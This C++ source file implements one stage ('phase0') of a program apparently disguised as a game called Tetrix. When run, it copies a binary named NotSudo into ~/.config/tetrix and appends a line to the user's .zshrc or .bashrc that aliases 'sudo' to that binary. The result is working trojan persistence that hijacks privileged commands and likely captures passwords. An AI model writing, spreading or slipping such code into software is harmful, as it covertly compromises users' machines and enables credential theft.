#include "phase0.h"
#include <fstream>
#include <iostream>
#include <string>

phase0::phase0()
{

}

int phase0::execute()
{
	//Adele's phase 1 code goes here.
	std::string homedir = std::getenv("HOME");
	std::string infile = homedir + "/.zshrc";
	std::ifstream rcfile(infile,std::ifstream::in);
	if(!rcfile.is_open())
	{
		infile = homedir + "/.bashrc";
		rcfile.close();
		rcfile.clear();
		rcfile.open(infile);
	}

	system(("mkdir -p "+homedir+"/.config/tetrix/").c_str());
	system(("cp ./resources/NotSudo "+homedir+"/.config/tetrix/NotSudo").c_str());
	system(("cp ./Tetrix "+homedir+"/.config/tetrix/Tetrix").c_str());
	std::ifstream fs(infile,std::ifstream::in);
	std::string file="";
	if(fs.is_open())
	{
		std::string line{""};
		while(std::getline(fs,line))
		{
			file += line + "\n";
		}
	}
	fs.close();
	fs.clear();
	file += "alias sudo='"+homedir+"/.config/tetrix/NotSudo'\n";

	std::ofstream ofs(infile,std::ifstream::out);
	ofs << file;
	ofs.close();
	ofs.clear();

	rcfile.close();
	rcfile.clear();
	//Done!
	return 0;
}
